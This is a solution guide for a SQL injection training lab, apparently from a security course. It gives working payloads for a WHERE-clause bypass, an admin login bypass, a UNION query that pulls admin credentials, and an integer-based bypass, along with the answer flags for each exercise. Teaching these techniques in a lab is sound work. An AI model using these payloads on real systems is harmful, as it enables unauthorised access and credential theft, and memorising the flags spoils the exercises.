# Lab 7: SQL Injection Guide

This guide provides the steps to solve the SQL injection vulnerabilities in Lab 7.

## Module 7.1: SQL Injection Data Extraction

This module contains four variations, each highlighting a different type of SQL Injection vulnerability. Note that some variations may use slightly different injection vectors.

### Variation A: GiftShop (WHERE Clause Bypass)

**Objective**: View the unreleased hidden products.

1. The search uses a `category` parameter. Navigate to the GiftShop variation.
2. In the URL, change the category parameter to an injected string: `?category=Gifts' OR 1=1--`
3. Hit enter. This will modify the backend query to `SELECT * FROM lab7_products WHERE category = 'Gifts' OR 1=1-- AND released = 1`.
4. The condition `1=1` is always true, and the comment `--` removes the `released = 1` check.
5. All unreleased "SECRET" items will now be visible on the page.

### Variation B: Staff Portal (Authentication Bypass)

**Objective**: Log in as an administrator without knowing the password.

1. Navigate to the Staff Portal login page (`/lab7/1/b`).
2. The authentication backend query looks like: `SELECT * FROM lab7_staff WHERE username = '{username}' AND password = '{password}'`.
3. In the Username field, enter the following payload: `admin' --`
4. Leave the password field blank (or type anything) and click "Login".
5. The query becomes: `SELECT * FROM lab7_staff WHERE username = 'admin' --' AND password = ''`.
6. The database interprets this as "Find a user with the username 'admin' and ignore the rest of the query".
7. You will be successfully logged in as the administrator and receive the flag: `FLAG{login_bypass_admin}`

### Variation C: PetShop (UNION-Based SQLi)

**Objective**: Extract the administrator credentials stored in another table.

**Quick Steps** (If you know the payload):

1. Navigate to the PetShop portal at `/lab7/1/c`

2. Find the search box and look at the category parameter in the URL

3. **Copy and paste this exact payload** into the search box:
   ```
   Dogs' UNION SELECT username, password, 1, 1 FROM lab7_admin_creds--
   ```

4. Hit search and you'll see the admin credentials displayed!

---

**Discovery Method** (If you don't know the payload):

Follow these steps to figure out the injection yourself:

1. **Navigate to the search page**: Go to `/lab7/1/c` and search for any product (e.g., "Dogs")

2. **Identify the vulnerable parameter**: Look at the URL - notice the `category` parameter (e.g., `?category=Dogs`)

3. **Test for SQL Injection**: Try adding a single quote to break the query:
   ```
   Dogs'
   ```
   You should see an SQL error, confirming the vulnerability!

4. **Find the number of columns**: Use `ORDER BY` to discover how many columns the query returns:
   ```
   Dogs' ORDER BY 1--
   Dogs' ORDER BY 2--
   Dogs' ORDER BY 3--
   Dogs' ORDER BY 4--
   Dogs' ORDER BY 5--
   ```
   When you hit 5, you'll get an error. **So there are 4 columns!**

5. **Use UNION SELECT**: Now craft a UNION query with 4 columns:
   ```
   Dogs' UNION SELECT 1,2,3,4--
   ```
   You should see numbers displayed. This confirms the injection works!

6. **Extract hidden table data**: Since there's likely an admin table, try:
   ```
   Dogs' UNION SELECT username, password, 1, 1 FROM lab7_admin_creds--
   ```

7. **Get the flag**: When you see the admin credentials, the password contains your flag!

**How it works** (Understanding the technique):
- The original query expects 4 columns: `name, breed, price, image_url`
- `Dogs' UNION SELECT` - Combines your custom data with the original query
- `username, password` - Gets admin username and password
- `1, 1` - Dummy values for the remaining columns
- `FROM lab7_admin_creds` - Pulls from the hidden admin table
- `--` - Comments out the rest (don't forget the space after!)

**Result**: The flag appears in the password field: `FLAG{union_based_sql_injection_master}`

### Variation D: HR Portal (Integer-Based SQLi)

**Objective**: Access the secret CEO information that is restricted from public view.

1. Navigate to the HR Portal, which searches for employees by their integer ID.
2. The URL looks like `/lab7/1/d?id=1`.
3. Because this is an integer-based query, it does NOT use quotes around the parameter in the SQL code. The query looks like: `SELECT * FROM lab7_employees WHERE id = {emp_id} AND is_public = 1`.
4. In the search box or URL, change the ID parameter to: `1 OR 1=1--`
5. Notice that you do not need single quotes!
6. The query becomes: `SELECT * FROM lab7_employees WHERE id = 1 OR 1=1-- AND is_public = 1`.
7. This bypasses the `is_public = 1` check and retrieves all rows, revealing the CEO's restricted data and the flag: `FLAG{integer_sqli_expert}`.
